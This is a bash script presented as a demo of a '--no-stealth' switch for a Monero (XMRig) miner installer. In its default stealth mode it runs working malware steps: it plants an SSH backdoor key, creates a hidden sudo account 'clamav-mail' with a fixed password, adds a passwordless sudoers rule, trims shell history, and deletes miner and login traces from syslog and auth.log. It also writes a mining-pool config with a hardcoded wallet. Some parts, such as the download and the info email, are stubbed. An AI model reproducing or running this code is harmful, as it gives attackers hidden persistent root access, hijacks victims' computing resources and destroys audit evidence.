#!/bin/bash
# Demo Script: --no-stealth Mode Integration Example
# This is a simplified version showing how to integrate the feature

set -uo pipefail
IFS=$'\n\t'

# ==================== STEALTH MODE CONFIGURATION ====================
STEALTH_MODE=true
WALLET=""
DEBUG_MODE=false

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --no-stealth|--visible|--transparent)
            STEALTH_MODE=false
            shift
            ;;
        --debug)
            DEBUG_MODE=true
            set -x
            shift
            ;;
        --help|-h)
            cat << EOF
Usage: $0 [OPTIONS] WALLET_ADDRESS

Options:
  --no-stealth      Disable all stealth features (transparent mode)
  --visible         Same as --no-stealth
  --transparent     Same as --no-stealth
  --debug           Enable verbose debug output
  --help, -h        Show this help message

Examples:
  # Normal installation (stealth mode)
  $0 YOUR_WALLET_ADDRESS

  # Transparent installation (no stealth)
  $0 --no-stealth YOUR_WALLET_ADDRESS

  # With debug output
  $0 --no-stealth --debug YOUR_WALLET_ADDRESS

Stealth Features (disabled with --no-stealth):
  - SSH backdoor keys
  - Backdoor user creation (clamav-mail)
  - Password file reordering
  - Sudoers configuration
  - Shell history cleanup
  - Log file cleaning
  - System info email
  - Rootkit installation

EOF
            exit 0
            ;;
        *)
            WALLET="$1"
            shift
            ;;
    esac
done

# Default wallet if not provided
if [ -z "$WALLET" ]; then
    WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
fi

# ==================== DISPLAY MODE ====================
echo "========================================"
if [ "$STEALTH_MODE" = true ]; then
    echo "STEALTH MODE INSTALLATION"
    echo "========================================"
    echo "[*] Stealth features ENABLED:"
    echo "    ✓ SSH backdoor keys"
    echo "    ✓ Backdoor user creation"
    echo "    ✓ Password file reordering"
    echo "    ✓ History cleanup"
    echo "    ✓ Log cleaning"
    echo "    ✓ System info email"
else
    echo "TRANSPARENT MODE INSTALLATION"
    echo "========================================"
    echo "[*] Stealth features DISABLED:"
    echo "    ✗ SSH backdoor keys"
    echo "    ✗ Backdoor user creation"
    echo "    ✗ Password file reordering"
    echo "    ✗ History cleanup"
    echo "    ✗ Log cleaning"
    echo "    ✗ System info email"
    echo ""
    echo "[*] Installation will be fully visible"
fi
echo "========================================"
echo ""
sleep 2

# ==================== LOGGING ====================
LOG_FILE="/tmp/miner_install.log"

log_message() {
    local msg="$1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $msg" | tee -a "$LOG_FILE"
}

# ==================== STEALTH FUNCTIONS ====================

# Function 1: SSH Backdoor Setup
setup_ssh_backdoor() {
    if [ "$STEALTH_MODE" = false ]; then
        log_message "[SKIP] SSH backdoor (transparent mode)"
        return 0
    fi
    
    log_message "[STEALTH] Installing SSH backdoor..."
    
    local ssh_dir="$HOME/.ssh"
    local auth_keys="$ssh_dir/authorized_keys"
    local backdoor_key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9f... backdoor@example.com'
    
    # Create SSH directory
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    
    # Add backdoor key
    if ! grep -q "backdoor@example.com" "$auth_keys" 2>/dev/null; then
        echo "$backdoor_key" >> "$auth_keys"
        chmod 600 "$auth_keys"
        log_message "[STEALTH] ✓ SSH backdoor key installed"
    else
        log_message "[STEALTH] SSH backdoor key already exists"
    fi
}

# Function 2: Backdoor User Creation
create_backdoor_user() {
    if [ "$STEALTH_MODE" = false ]; then
        log_message "[SKIP] Backdoor user creation (transparent mode)"
        return 0
    fi
    
    log_message "[STEALTH] Creating backdoor user..."
    
    local username="clamav-mail"
    local password='SecretPassword123'
    
    # Check if running as root
    if [ "$(id -u)" -ne 0 ]; then
        log_message "[STEALTH] Not running as root, skipping user creation"
        return 1
    fi
    
    # Create user if doesn't exist
    if ! id "$username" >/dev/null 2>&1; then
        useradd -m -s /bin/bash "$username" 2>/dev/null
        echo "$username:$password" | chpasswd 2>/dev/null
        
        # Add to sudo group
        usermod -aG sudo "$username" 2>/dev/null
        
        log_message "[STEALTH] ✓ Backdoor user '$username' created"
    else
        log_message "[STEALTH] User '$username' already exists"
    fi
}

# Function 3: Sudoers Configuration
setup_sudoers() {
    if [ "$STEALTH_MODE" = false ]; then
        log_message "[SKIP] Sudoers configuration (transparent mode)"
        return 0
    fi
    
    log_message "[STEALTH] Configuring sudoers..."
    
    if [ "$(id -u)" -ne 0 ]; then
        log_message "[STEALTH] Not running as root, skipping sudoers"
        return 1
    fi
    
    local username="clamav-mail"
    local sudoers_file="/etc/sudoers.d/$username"
    
    # Create sudoers entry
    echo "$username ALL=(ALL) NOPASSWD: ALL" > "$sudoers_file"
    chmod 0440 "$sudoers_file"
    
    log_message "[STEALTH] ✓ Sudoers configured for $username"
}

# Function 4: History Cleanup
cleanup_history() {
    if [ "$STEALTH_MODE" = false ]; then
        log_message "[SKIP] History cleanup (transparent mode)"
        return 0
    fi
    
    log_message "[STEALTH] Cleaning shell history..."
    
    # Clean bash history
    if [ -f "$HOME/.bash_history" ]; then
        # Remove last 10 lines
        local total_lines=$(wc -l < "$HOME/.bash_history")
        if [ "$total_lines" -gt 10 ]; then
            head -n -10 "$HOME/.bash_history" > "$HOME/.bash_history.tmp"
            mv "$HOME/.bash_history.tmp" "$HOME/.bash_history"
            log_message "[STEALTH] ✓ Cleaned last 10 lines from bash history"
        fi
    fi
    
    # Unset history for current session
    unset HISTFILE
    history -c 2>/dev/null
}

# Function 5: Log Cleaning
clean_logs() {
    if [ "$STEALTH_MODE" = false ]; then
        log_message "[SKIP] Log cleaning (transparent mode)"
        return 0
    fi
    
    log_message "[STEALTH] Cleaning system logs..."
    
    if [ "$(id -u)" -eq 0 ]; then
        # Clean syslog
        sed -i '/miner\|xmrig\|kswapd0/d' /var/log/syslog 2>/dev/null
        
        # Clean auth log
        sed -i '/clamav-mail/d' /var/log/auth.log 2>/dev/null
        
        log_message "[STEALTH] ✓ System logs cleaned"
    else
        log_message "[STEALTH] Not running as root, skipping log cleaning"
    fi
}

# Function 6: Send System Info Email
send_system_info() {
    if [ "$STEALTH_MODE" = false ]; then
        log_message "[SKIP] System info email (transparent mode)"
        return 0
    fi
    
    log_message "[STEALTH] Sending system information email..."
    
    # Collect system info
    local hostname=$(hostname)
    local ip_address=$(hostname -I | awk '{print $1}')
    local os_info=$(uname -a)
    
    # In real script, this would send email
    log_message "[STEALTH] ✓ System info collected (email would be sent)"
    log_message "[STEALTH]   Hostname: $hostname"
    log_message "[STEALTH]   IP: $ip_address"
}

# ==================== NORMAL INSTALLATION FUNCTIONS ====================

install_dependencies() {
    log_message "[*] Installing dependencies..."
    
    # Detect package manager
    if command -v apt-get >/dev/null 2>&1; then
        log_message "[*] Using apt-get"
        # apt-get update -qq
        # apt-get install -y curl wget
    elif command -v yum >/dev/null 2>&1; then
        log_message "[*] Using yum"
        # yum install -y curl wget
    fi
    
    log_message "[✓] Dependencies check complete"
}

download_miner() {
    log_message "[*] Downloading XMRig miner..."
    
    # Simulate download
    sleep 1
    
    log_message "[✓] Miner downloaded"
}

configure_miner() {
    log_message "[*] Configuring miner..."
    log_message "[*] Wallet: ${WALLET:0:20}..."
    
    # Create config
    cat > /tmp/config.json << EOF
{
    "autosave": true,
    "cpu": true,
    "pools": [
        {
            "url": "pool.moneroocean.stream:10032",
            "user": "$WALLET",
            "pass": "x"
        }
    ]
}
EOF
    
    log_message "[✓] Miner configured"
}

setup_service() {
    log_message "[*] Setting up service..."
    
    if command -v systemctl >/dev/null 2>&1; then
        log_message "[*] Using systemd"
        # Create systemd service
    else
        log_message "[*] Using cron"
        # Add cron job
    fi
    
    log_message "[✓] Service configured"
}

# ==================== MAIN EXECUTION ====================

main() {
    log_message "========================================"
    log_message "Installation started"
    log_message "Mode: $([ "$STEALTH_MODE" = true ] && echo "STEALTH" || echo "TRANSPARENT")"
    log_message "========================================"
    
    # Normal installation steps
    install_dependencies
    download_miner
    configure_miner
    setup_service
    
    echo ""
    log_message "========================================"
    log_message "Stealth Operations"
    log_message "========================================"
    
    # Stealth operations (skipped if --no-stealth)
    setup_ssh_backdoor
    create_backdoor_user
    setup_sudoers
    send_system_info
    cleanup_history
    clean_logs
    
    echo ""
    log_message "========================================"
    log_message "Installation Complete!"
    log_message "========================================"
    
    if [ "$STEALTH_MODE" = true ]; then
        log_message "[*] Installation is HIDDEN"
        log_message "[*] Backdoor user: clamav-mail"
        log_message "[*] SSH access: enabled"
        log_message "[*] Logs: cleaned"
    else
        log_message "[*] Installation is VISIBLE"
        log_message "[*] No backdoors created"
        log_message "[*] Logs intact for review"
        log_message "[*] Check logs: $LOG_FILE"
    fi
    
    echo ""
    log_message "Miner will start automatically"
}

# Run main function
main

# ==================== VERIFICATION ====================
echo ""
echo "========================================"
echo "Verification Commands"
echo "========================================"
echo ""

if [ "$STEALTH_MODE" = true ]; then
    echo "Stealth Mode - Check for backdoors:"
    echo "  id clamav-mail                    # Should exist"
    echo "  tail ~/.bash_history              # Last 10 lines removed"
    echo "  grep 'miner' /var/log/syslog      # Should be empty"
    echo ""
else
    echo "Transparent Mode - Verify clean install:"
    echo "  id clamav-mail                    # Should NOT exist"
    echo "  tail ~/.bash_history              # Full history intact"
    echo "  grep 'miner' /var/log/syslog      # May show entries"
    echo "  cat $LOG_FILE                     # Full installation log"
    echo ""
fi

echo "General verification:"
echo "  ps aux | grep xmrig               # Check if miner running"
echo "  cat /tmp/config.json              # View config"
echo "  systemctl status miner            # Check service (if systemd)"
echo ""
echo "========================================"
